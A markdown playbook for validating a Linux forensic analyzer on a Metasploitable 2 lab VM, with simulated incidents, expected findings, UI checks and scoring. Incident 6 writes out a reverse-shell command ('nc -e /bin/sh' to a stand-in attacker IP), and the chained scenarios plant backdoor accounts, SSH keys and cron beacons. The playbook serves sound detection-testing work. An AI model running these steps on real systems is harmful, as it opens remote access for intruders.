# Report playbook — Metasploitable 2, incident by incident

A step-by-step validation procedure for the report: collect a **baseline**,
run each incident on a fresh snapshot, and diff the tool's findings against a
**blind manual live analysis**. Ends with a chained multi-incident case that
exercises the correlations single incidents cannot.

---

## 0. Read this first — Metasploitable 2 changes what is possible

Your target is **Ubuntu 8.04 "Hardy"**. That predates a lot of what the
analyzer knows how to read, and it ships deliberately broken. Four consequences
you must state in the report up front:

1. **No systemd / journald / auditd.** These rules/parsers will produce
   little or nothing on this box:
   - `journald_parser`, `journald_sequence_gap` — no journal at all.
   - `systemd_unit` persistence — `/etc/systemd/system` does not exist (Hardy
     uses upstart `/etc/event.d`).
   - `auditd_parser` — auditd is not installed. **Scenario 6 needs a
     workaround** (see below).
   This is not a tool defect — it is the collector's cross-distro handling
   doing its job on an old host. Report it as coverage, not failure.

2. **The snapshot is NOT clean.** Metasploitable is intentionally vulnerable,
   so a *baseline* collection of the untouched box already trips several rules
   (at minimum `sshd_config_risk` — it ships `PermitRootLogin yes`). **You must
   collect a baseline first** and treat every baseline finding as pre-existing.
   Only the *delta* over baseline is attributable to your incident.

3. **Set the clock.** `sudo date -u -s "YYYY-MM-DD HH:MM:SS"` to the real
   current time before you start. Syslog carries no year; the analyzer infers
   it from the log file's mtime, so a stale VM clock makes every event land in
   2010. A correct clock keeps injected events in the right year.

4. **Every syslog event will be `year_inferred`, not `exact`.** That is
   correct and honest (classic syslog has no year). Point to the per-event
   `timestamp_confidence` column as evidence the tool does not overclaim.

---

## 1. One-time setup

```sh
# On the target VM (Metasploitable 2):
sudo date -u -s "2026-09-12 09:00:00"      # real current time
sudo apt-get update && sudo apt-get install -y auditd   # OPTIONAL, for #6 (may
                                                          # fail on kernel 2.6;
                                                          # if so, use the ps path)
```

Take a VM snapshot now and name it **CLEAN**. Every incident starts by
restoring CLEAN.

On the **examiner machine** (where this repo lives), have the analyzer ready:
`python -m lfa --help`.

---

## 2. The BASELINE collection (do this once, from CLEAN)

```sh
# TARGET: collect the untouched box
sudo sh collector/collect.sh -o /tmp/out -c CASE-BASELINE -p "YourName" -z
# move /tmp/out/CASE-BASELINE*.tar.gz to the examiner machine, then:
python -m lfa analyse CASE-BASELINE*.tar.gz --case-dir cases/BASELINE --examiner "YourName"
python -m lfa verify cases/BASELINE
```

**Expected baseline findings on a virgin Metasploitable 2** — record these as
PRE-EXISTING (your incidents must be judged as *new findings on top of* this):

| Rule | Why it fires on the clean box |
|------|-------------------------------|
| `sshd_config_risk` | ships `PermitRootLogin yes` (confirmed in your bundle) |
| `passwordless_account` | likely — Metasploitable has weak/blank accounts |
| `uid0_account` | check — any non-root UID-0 present out of the box |
| `privileged_group_member` | `msfadmin` and others in admin groups |

> Query the baseline set once and keep it:
> `sqlite3 cases/BASELINE/case.db "SELECT rule_name, title FROM findings ORDER BY rule_name;"`

The baseline is also the reference collection for the **`first_seen`** rule,
which only means anything across two collections (baseline vs. incident).

---

## 3. The repeatable per-incident loop

For each incident N (run from CLEAN each time):

```sh
# 1. TARGET: restore snapshot CLEAN, set the clock again if it drifted.
# 2. TARGET: run the incident
cd testlab/scenarios && sudo sh 0N_<name>.sh          # LFA_LAB_CONFIRM=yes to skip prompt
# 3. TARGET: collect
sudo sh ../../collector/collect.sh -o /tmp/out -c CASE-0N -p "YourName" -z
# 4. Move bundle to examiner; analyse + verify
python -m lfa analyse CASE-0N*.tar.gz --case-dir cases/CASE-0N --examiner "YourName"
python -m lfa verify cases/CASE-0N
# 5. BLIND manual live analysis on the TARGET (before you open the report!)
#    run the "manual checks" for incident N below; write findings to a file; seal it.
# 6. Score the rule-backed threats
python tools/score_detection.py --case-dir cases/CASE-0N \
       --ground-truth testlab/scenarios/0N_<name>.ground_truth.json
# 7. Diff three ways: ground truth vs tool findings vs your manual notes.
# 8. Restore CLEAN before the next incident.
```

**Order of operations matters:** run the collector *before* your manual live
analysis. Your manual commands write `.bash_history`, `wtmp`/`lastlog`, and
`auth.log` sudo entries — the very artifacts the collector reads. Collect
first so your own activity does not contaminate the evidence.

---

## 4. Per-incident expected artifacts

Notation: **Findings** = rows expected in the `findings` table (scored).
**Evidence** = `events`-table `subcategory` values to expect on the timeline.
**Manual** = the independent live command that establishes the same fact.

### Incident 1 — Unauthorized login (`01_unauthorized_login.sh`)

| | |
|---|---|
| **New findings** | `off_hours_privileged` |
| **Evidence** | `successful_login` (source_ip `203.0.113.9`), `session_opened` |
| **Manual** | `grep "Accepted password" /var/log/auth.log`; `last -a \| head`; `grep "sudo:" /var/log/auth.log \| awk '{print $3}'` (bucket by hour) |
| **Won't fire / why** | `brute_force_success` does **not** fire — a lone accepted login has no preceding failure burst (that's incident 2). |
| **Notes** | The off-hours 03:14 sudo line is injected into `auth.log`; the source IP/time are simulated (you can't spoof a routable IP locally). |

### Incident 2 — Brute-force SSH (`02_brute_force_ssh.sh`)

| | |
|---|---|
| **New findings** | `brute_force`, `brute_force_success` |
| **Evidence** | `failed_login` ×6 (one source), `successful_login` |
| **Manual** | `sudo lastb \| head -50`; `grep -c "Failed password" /var/log/auth.log`; correlate the `Accepted password` timestamp against the failure burst |
| **Threshold** | rule needs **≥5 failures in 5 min** from one source; the script sends 6. |
| **Notes** | `GENUINE_SSH=1` does real localhost failed logins (source = `127.0.0.1`, genuine sshd/PAM records); default injects with the attacker IP for a clean single-source burst. |

### Incident 3 — Insider activity (`03_insider_activity.sh`)

| | |
|---|---|
| **New findings** | `off_hours_privileged`, `wiped_history` |
| **Evidence** | `session_opened` ×4, zero-byte `.bash_history` |
| **Manual** | `ls -la /home/insider/.bash_history` (0 bytes); `grep "sudo:.*insider" /var/log/auth.log`; `last insider` |
| **Threshold** | `wiped_history` needs **≥3 sessions** before an empty history counts; the script logs 4. |
| **Won't appear** | the staged files under `/tmp/exfil_staging` are **not collected** (the collector does not walk `/tmp`); their only trace is the injected `tar` command in the sudo line. Good example of "the artifact is the log entry, not the file." |

### Incident 4 — USB data theft (`04_usb_data_theft.sh`)

| | |
|---|---|
| **New findings** | **none** — evidence-only by design (like the browser/netstat parsers) |
| **Evidence** | `usb_connect`, `usb_disconnect` (with vendor/product/serial + connection duration), `storage_device` (mount) |
| **Manual** | `dmesg \| grep -iE "usb-storage\|idVendor\|Product:"`; `lsblk`; `mount \| grep sd` |
| **Requires** | a VM with **USB passthrough** (VirtualBox/VMware) — not WSL. Insert, mount, copy, **unmount + remove** (removal is what records the disconnect and the duration). |
| **Validate** | `sqlite3 cases/CASE-04/case.db "SELECT timestamp_utc,description FROM events WHERE subcategory IN ('usb_connect','usb_disconnect');"` |

### Incident 5 — Privilege escalation (`05_privilege_escalation.sh`)

| | |
|---|---|
| **New findings** | `uid0_account`, `passwordless_account`, `privileged_group_member`, `new_account_privilege_grant` |
| **Evidence** | `account`, `passwordless_account`, `privileged_group_member`, `group_membership_added`, `uid0_account` |
| **Manual** | `awk -F: '$3==0{print $1}' /etc/passwd`; `sudo awk -F: '$2==""{print $1}' /etc/shadow`; `getent group sudo adm docker`; diff `/etc/passwd` vs `/etc/passwd-` |
| **Baseline caveat** | subtract the baseline — Metasploitable may already have passwordless/privileged accounts. The **new** `sysmon`(uid0), `svc_backup`(nopass), `helpdesk`(groups) are yours. |
| **Notes** | 100% genuine mutations; highest-value rule-backed incident (four rules). |

### Incident 6 — Suspicious process execution (`06_suspicious_process_execution.sh`)

| | |
|---|---|
| **New findings (with auditd)** | `suspicious_process` (Medium confidence in isolation; High only when correlated with a brute-forced login → see the chain) |
| **New findings (no auditd — the Metasploitable default)** | `suspicious_process` still fires, from **shell history**: type the payloads at an interactive shell and the history file carries them. A reverse shell still alive at collection time (`ps aux` → `running_process`) is a second, independent path. |
| **Evidence** | `process_execution` (auditd, if installed), `running_process` (ps), `shell_command` / `suspicious_command` (history) |
| **Manual** | `sudo ausearch -k lfa_exec -i` (if auditd); `ps aux \| grep -E "nc\|/dev/tcp"`; `cat /home/*/.bash_history` |
| **To make #6 score on Metasploitable** | run the payload commands **interactively** (not from the script, which is a non-interactive `sh` and writes no history), then `exit` the shell so bash flushes `~/.bash_history`, then collect. Optional extras: (a) install auditd for kernel-level proof, (b) leave a listener running — `nc -e /bin/sh 203.0.113.9 4444 &` — so `ps` catches it too. |
| **How the shell-history path scores** | `suspicious_process` consumes `shell_command` **and** `suspicious_command` events. Confidence is capped at Medium when history is the only source, and the finding says why in plain English: history records what was *typed*, not what the kernel ran, and the account owner can edit or wipe it. Set `HISTTIMEFORMAT` first and the entries carry timestamps, which lets the same login correlation raise it to High. |
| **Corroboration** | one command recorded by two artifacts (auditd *and* history) is **one** finding naming both sources — not two duplicates. |

---

## 4b. Where to look in the UI

You have **two** UIs, and they answer different questions. Use both on every
incident — if a fact appears in only one of them, that is itself a finding
about the tool.

| UI | Start it with | What it is for |
|----|---------------|----------------|
| **Report** (`cases/<CASE>/report.html`) | open the file, or `python -m lfa report --case-dir cases/<CASE>` to re-render | The narrative deliverable. Findings with plain-English reasoning, the timeline, the Intel panels, and the appendices that state what the tool could *not* determine. This is what you hand to a reader. |
| **Explorer** (`python -m lfa serve`, then **🔬 Explore** on the case card) | `python -m lfa serve --cases-dir cases` → `http://127.0.0.1:8000` | The investigation surface. Three tabs — **📋 Event Timeline**, **📁 Artifact Tree**, **🚨 SOC Findings** — with live search and filters over the whole `events` table, not the report's 1500-row sample. Use it to *hunt*; use the report to *explain*. |

### Orientation — the six report sections

`Summary` → `Findings` → `Timeline` → `Evidence` → `Intel` → `Appendices`.

- **Summary** — counts, key observations, recommended next steps. Your first
  sanity check: did the incident move the numbers at all?
- **Findings** — one block per scored rule, each with *what happened / why it
  matters / confidence / what to check next*. **Confidence is the column to
  scrutinise**, not just presence.
- **Timeline** — sortable, filterable event sample. Note the printed row cap;
  the Explorer has no cap.
- **Evidence** — host inventory and the artifact list with SHA-256 per file.
  This is where you prove the finding came from a file you actually collected.
- **Intel** — four panels (**Accounts and access**, **Network**, **Activity**,
  **System**), each a set of collapsible tables. This is the per-incident
  landing zone; the table below names which one.
- **Appendix A** (methodology + coverage), **Appendix B** (*what we could not
  determine* — on Metasploitable this should explicitly mention the missing
  journald/auditd/systemd), **Appendix C** (glossary).

### Explorer — the filters you will actually use

Event Timeline tab: free-text **search** (keyword, command, IP, user,
artifact), a **Category** dropdown (`login_activity`, `privilege_escalation`,
`persistence`, `user_activity`, `hardware_usb`, `user_accounts`, …), **severity
pills** (All / High / Med / Low / Info), a **User** dropdown, and a page-size
selector. Click a row to expand it to the raw line, byte offset and source
artifact path — that is your chain of custody back to the file.

### Per-incident UI checks

| # | Explorer (Event Timeline tab) | Report — Findings | Report — Intel panel |
|---|-------------------------------|-------------------|----------------------|
| **1** Unauthorized login | Category `login_activity`; search `203.0.113.9` | `off_hours_privileged` — check the hour it names matches the injected 03:14 | **Accounts and access** → *Sessions* (the login with its terminal + duration) and *Remote addresses* |
| **2** Brute force | Category `login_activity`, severity **High**; search `Failed password` | `brute_force` and `brute_force_success` — confirm the success is linked to the same source IP as the burst | **Accounts and access** → *Failed logins* (grouped with attempt count, first/last) then *Sessions* for the success |
| **3** Insider activity | Search the insider username; Category `user_activity` | `off_hours_privileged`, `wiped_history` — the latter must cite the ≥3 sessions that make an empty history meaningful | **Accounts and access** → *Sessions* (the 4 sessions); **Activity** → *Shell history* (should be **empty** for that user — absence is the evidence) |
| **4** USB data theft | Category `hardware_usb` | **none — by design.** Confirm the Findings section does *not* invent one | **System** → *Hardware and USB* (connect/disconnect with vendor/product/serial and duration) and *Storage* (the mount) |
| **5** Privilege escalation | Category `user_accounts` and `privilege_escalation` | `uid0_account`, `passwordless_account`, `privileged_group_member`, `new_account_privilege_grant` — **four separate findings**; diff against BASELINE, Metasploitable ships some already | **Accounts and access** → *Local accounts* (the new `sysmon`/`svc_backup`/`helpdesk`) and *Account changes* |
| **6** Suspicious process | Category `user_activity`, severity **High**; search `nc -e`, `/dev/tcp`, `curl` | `suspicious_process` — read the **confidence**: Medium if history/ps only, High only if correlated to a brute-forced login. A history-only finding must say history is editable | **Activity** → *Shell history* (the typed commands); **Network** → *Listening and established sockets* if a shell was still alive |

### Artifact Tree tab — prove the file, not just the event

For every incident, switch to **📁 Artifact Tree** and open the file the
finding cites. You are checking three things:

1. the artifact is **present** in the bundle at the path the finding names;
2. its **SHA-256** matches the Evidence section of the report (and
   `python -m lfa verify cases/<CASE>` passes);
3. the **raw line** shown when you expand the event really exists at that byte
   offset in that file.

Files worth opening per incident: **1/2** `var/log/auth.log`; **3**
`home/<insider>/.bash_history` (zero bytes) and `var/log/wtmp`; **4**
`var/log/dmesg` (or `kern.log`); **5** `etc/passwd`, `etc/shadow`, `etc/group`;
**6** `home/*/.bash_history`, `volatile/ps.txt`, and `var/log/audit/audit.log`
if you installed auditd.

---

## 5. The chained incident (the finale)

Run everything on **one** CLEAN snapshot, in kill-chain order, then collect
**once**. This is where correlations appear that no single-incident case can
show.

**One command — `chain.sh` runs the whole kill chain in order:**

```sh
# restore CLEAN, set the clock, then:
cd testlab/scenarios
sudo sh chain.sh                       # 02→01→05→07→06→03 on one snapshot
# LFA_LIVE_SHELL=1 sudo sh chain.sh    # also leave a live reverse shell for ps
```

`chain.sh` runs the stages below in kill-chain order, then **stops before
collection** and prints the exact collect→analyse→verify→score block. The
persistence stage is now scenario `07_persistence.sh` (SSH key + cron beacon),
which the driver runs with no local anchor because scenario 02 already provided
the brute-forced login that `persistence_after_login` correlates against:

```
1. 02  break in       brute-force burst + a success from the attacker IP
2. 01  foothold       off-hours privileged action from that IP
3. 05  escalate       backdoor accounts (uid0 / nopass / privileged group)
4. 07  persist        SSH key in /root/.ssh/authorized_keys + /etc/cron.d beacon
5. 06  execute        curl beacon / reverse-shell payloads
6. 03  anti-forensics (optional 2nd actor) history wipe
```

**Then COLLECT ONCE** (the driver prints this for you):

```sh
sudo sh ../../collector/collect.sh -o /tmp/out -c CASE-CHAIN -p "YourName" -z
```

**Analyse against the baseline** (so `first_seen` has its reference):

```sh
python -m lfa analyse CASE-CHAIN*.tar.gz --case-dir cases/CASE-CHAIN --examiner "YourName"
python -m lfa verify cases/CASE-CHAIN
```

**Expected findings in the chain — including the emergent correlations:**

| Finding | Only appears in the chain because… |
|---------|-------------------------------------|
| `brute_force` + `brute_force_success` | the burst and the success are both present |
| `persistence_after_login` | the SSH key + cron were created **within 120 min** of the brute-forced login — the rule correlates login IP + time with persistence |
| `suspicious_process` **High confidence** | the reverse shell ran within an hour of the login from an IP that also brute-forced the host — post-compromise execution |
| `uid0_account`, `passwordless_account`, `privileged_group_member`, `new_account_privilege_grant` | from the privesc stage |
| `off_hours_privileged`, `wiped_history` | from the foothold + anti-forensics |
| `first_seen` | new accounts/keys/cron absent from the baseline |

**The timeline to reconstruct** (your report's centrepiece): burst from
`203.0.113.9` → accepted login → new UID-0 + nopass accounts → SSH key + cron
persistence → reverse shell / curl beacon → history wiped. Every step should
be one clickable chain of events in the report's timeline, tied together by the
attacker IP and the ±window correlations.

**Score the chain** against a merged ground truth:

```sh
# merge the per-scenario ground-truth files into one, then score
python - <<'PY'
import json, glob
threats=[]
for f in sorted(glob.glob("testlab/scenarios/0*.ground_truth.json")):
    threats += json.load(open(f)).get("injected_threats", [])
json.dump({"scenario_name":"chained_incident","injected_threats":threats},
          open("testlab/scenarios/chain.ground_truth.json","w"), indent=2)
print(f"merged {len(threats)} threats")
PY
python tools/score_detection.py --case-dir cases/CASE-CHAIN \
       --ground-truth testlab/scenarios/chain.ground_truth.json
```

---

### Checking the chain in the UI — the correlations are the point

A chained case is judged on **links**, not on counts. Anyone can list six
findings; the question is whether the tool tied them into one story.

**In the Explorer:**

1. **Event Timeline tab → search the attacker IP** (`203.0.113.9`) with
   Category `all`. This single query should return the whole kill chain in
   order: the failure burst, the accepted login, then everything the attacker
   did. If the later stages do not carry the IP, check whether the *findings*
   still correlate them by time — that is the rule's job, not the event's.
2. **Severity pill → High**, Category `all`. Read it top to bottom as a
   narrative. Gaps here are the tool's blind spots.
3. **🚨 SOC Findings tab** — count the findings and subtract the BASELINE set.
   Only the delta is attributable to the chain.

**In the report — the findings that exist *only* because of chaining:**

| Finding | What to verify in its text |
|---------|----------------------------|
| `brute_force_success` | names the same source IP as the burst, and a success timestamp *after* it |
| `persistence_after_login` | cites the login it correlated against, and the SSH key / cron entry created inside the 120-minute window |
| `suspicious_process` at **High** confidence | its *why it matters* explicitly references the brute-forced login — if it still reads Medium, the payload fell outside the 60-minute window or the login did not correlate |
| `first_seen` | only means anything against BASELINE; confirm the new accounts/keys/cron are named as absent from the earlier collection |

**Then read Appendix B — "What we could not determine".** On a chained
Metasploitable case this is the most important page in the report: it should
name the missing journald/auditd/systemd coverage and any event it could not
time confidently. A chained case that claims certainty everywhere is
overclaiming.

**Cross-check the single-incident cases:** every finding in `CASE-01` …
`CASE-06` should also appear in `CASE-CHAIN`. One that does not is a real
defect — either a rule that only fires in isolation, or evidence one scenario
overwrote for another.

---

## 6. Three-way comparison worksheet (per case)

For every incident and the chain, fill this in — it is the evidence that your
evaluation was rigorous, not circular:

| Ground-truth item | Tool finding? (rule) | Manual finding? (your command) | Verdict |
|-------------------|:--------------------:|:------------------------------:|---------|
| T1110 brute force | ✅ `brute_force` | ✅ `lastb` showed 6 | true positive |
| … | … | … | tool-miss / analyst-miss / false-positive |

Verdicts to use: **true positive** (all three agree), **tool-miss** (ground
truth + manual, no finding), **analyst-miss** (ground truth + tool, you missed
it live — this is fine and expected, it shows the tool's value), **false
positive** (finding with no ground truth — check it's not real Metasploitable
dirt first), **pre-existing** (in baseline, not attributable to the incident).

Also score the layers beneath detection, because that is where tools really
fail:
- **Collection completeness** — read the collector's missing-artifact and
  degradation records; every REQUIRED artifact present or a recorded reason.
- **Integrity** — `python -m lfa verify` passes; spot-check a `sha256sum`
  against the live source.
- **Parse fidelity** — event count per source vs `wc -l` on the raw file;
  silent parser drops are the most common real defect.
- **Timeline correctness** — a known-time injected event lands at the right
  absolute time, with `timestamp_confidence = year_inferred` (honest, given
  syslog).

---

## 7. Modern Enterprise Intrusion Simulation (`mega_chain.sh`)

While the scenarios above target legacy hosts like Metasploitable 2, modern Linux enterprise environments (Ubuntu 22.04/24.04, Kali Linux, Debian 12, RHEL 9) run systemd journals, complex multi-user setups, and sophisticated multi-vector attacks.

`testlab/scenarios/mega_chain.sh` is an all-in-one standalone simulation script designed for modern targets:
1. **Background Corporate Noise:** Generates legitimate user accounts (`dev_sarah`, `admin_mike`), clean shell histories, benign cron tasks, systemd daemon noise, and internet scanner traffic.
2. **10-Stage Kill Chain:** Simulates SSH credential stuffing, breach foothold, hidden root UID 0 (`sysmon`), rogue service accounts (`svc_backup`), `/etc/sudoers.d` hijacking, SSH key injection, C2 cron beacons, dynamic linker hooks (`/etc/ld.so.preload`), profile execution traps, data staging, USB removable media theft simulation, and anti-forensic history wiping and log zeroing.
3. **Execution & Verification:**
   ```bash
   # 1. Run simulation on disposable lab VM / WSL:
   sudo sh testlab/scenarios/mega_chain.sh

   # 2. Collect evidence bundle:
   sudo sh collector/collect.sh -r / -o cases/wsl_enterprise -c CASE-ENTERPRISE-SIM -p "Examiner" -V -z

   # 3. Ingest and correlate offline:
   python -m lfa analyse cases/wsl_enterprise/*.tar.gz --case-dir cases/CASE-ENTERPRISE-SIM --examiner "Examiner"

   # 4. Score detections against ground truth:
   python tools/score_detection.py --case-dir cases/CASE-ENTERPRISE-SIM --ground-truth testlab/scenarios/mega_chain.ground_truth.json
   ```
For a comprehensive walkthrough of this scenario with annotated forensic screenshots, refer to [docs/FORENSIC_INVESTIGATION_AND_WALKTHROUGH_REPORT.md](../../docs/FORENSIC_INVESTIGATION_AND_WALKTHROUGH_REPORT.md).
